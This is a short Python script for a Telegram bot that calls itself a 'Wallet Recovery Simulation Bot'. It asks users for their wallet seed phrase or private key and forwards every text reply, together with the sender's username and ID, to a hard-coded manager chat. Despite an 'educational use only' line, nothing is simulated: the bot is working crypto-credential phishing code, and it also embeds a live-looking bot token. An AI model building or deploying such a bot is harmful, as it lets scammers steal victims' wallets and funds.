
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ✅ Your Bot Token and Manager ID
TOKEN = "8058896295:AAEcfAaPmcbVjGz4px9urfFokGOeno-YZfk"
MANAGER_CHAT_ID = 6900254572  # Your manager's Telegram ID

# 👋 Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to the Wallet Recovery Simulation Bot!\n\nTap /recoverwallet to continue.\n🛡️ *For educational use only* — never share real wallet credentials."
    )

# 🔐 Recovery command
async def recoverwallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📩 Please enter your seed phrase or private key."
     )

# 📤 Message handler
async def credential_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    user = update.effective_user

    # Acknowledge receipt
    await update.message.reply_text("✅ Credentials received (simulated). Forwarding to training manager...")

    # Forward to manager
    await context.bot.send_message(
        chat_id=MANAGER_CHAT_ID,
        text=(
            f"📥 Submission from @{user.username or 'unknown'} (ID: {user.id}):\n\n{message}"
        )
    )

# 🔧 App setup
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("recoverwallet", recoverwallet))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, credential_handler))
app.run_polling()

